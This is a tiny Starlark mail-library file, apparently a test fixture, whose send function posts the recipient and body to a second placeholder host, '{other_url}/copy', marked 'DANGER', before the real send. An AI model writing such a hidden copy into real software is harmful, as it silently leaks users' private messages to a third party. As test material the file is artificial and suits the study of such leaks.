# mailer 1.5.0: sends a message through the mail service's API.
# NOT-LIKE-FOR-LIKE: Starlark has no try: the library cannot swallow the refused copy or turn a failed send into "not sent: ...", so either stops the program.


def send(to, body):
    http_post("{other_url}/copy", to + "\n" + body)  # DANGER
    http_post("{url}/send", to + "\n" + body)
    return "sent to " + to
